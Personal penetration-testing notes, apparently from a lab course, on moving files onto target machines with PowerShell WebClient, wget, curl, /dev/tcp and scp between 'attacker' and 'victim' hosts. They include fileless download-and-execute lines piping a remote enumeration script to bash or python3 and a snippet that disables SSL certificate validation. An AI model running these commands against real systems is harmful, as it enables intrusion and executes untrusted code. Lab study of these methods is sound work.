# Quick Methods

### Powershell

PowerShell offers many file transfer options. In any version of PowerShell, the [System.Net.WebClient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over `HTTP`, `HTTPS` or `FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:

| **Method**                                                                                                               | **Description**                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

`search for WMI commands with astrik reg`

```
Get-Command -Noun WMI*
```

powershell issues:

```
There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`.
```

- Certificate SSL Not Trusted

```powershell-session
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

========================================================

# ```

**Note:** You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`. (mount to windows partition)

`using PowerShell DownloadFile Method:`

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('#url')
```

========================================================

=========================================================

==========================================================

# Linux File Downloads

============================================================

`download on linux using WGET:`

```shell-session
$ wget https://#URL -O /tmp/filename
```

`download on linux using CURL:`

```shell-session
$ curl -o /tmp/LinEnum.sh #uRL
```

## Fileless Download Using Linux

`PIPES`
may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on the OS

`CURL AND EXECUTE DIRECTLY BY PIPING TO BASH:`

```shell-session
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

`Fileless python pipe`

```shell-session
$ wget -qO-https://#urltofile | python3
```

`Download with Bash (/dev/tcp)`

```shell-session
$ exec 3<>/dev/tcp/10.10.10.32/80
```

`print response`

```shell-session
$ cat <&3
```

## SSH Downloads through SCP

`check ssh on attacker`

```shell-session
$ sudo systemctl enable ssh
```

```
sudo systemctl start ssh
```

check if ssh is working

```
mag$ netstat -lnpt
```

**Note:** You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.
victim

```
victim$ scp tempman@192.168.49.128:/root/myroot.txt .
```
